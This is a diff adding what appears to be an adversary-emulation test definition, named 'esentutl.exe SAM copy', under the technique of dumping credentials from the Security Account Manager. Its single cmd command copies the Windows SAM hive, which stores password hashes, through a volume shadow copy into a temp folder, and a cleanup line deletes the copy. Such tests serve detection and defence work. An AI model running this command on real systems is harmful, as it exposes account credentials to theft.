@@ -1,0 +1,12 @@
+#TechniqueName: OS Credential Dumping: Security Account Manager
+#AtomicTestName: esentutl.exe SAM copy
+#Description: Copy the SAM hive using the esentutl.exe utility&This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.&
+#Language: cmd
+
+#commands
+esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
+
+
+#cleanup_commands
+del %temp%\SAM >nul 2>&1
+
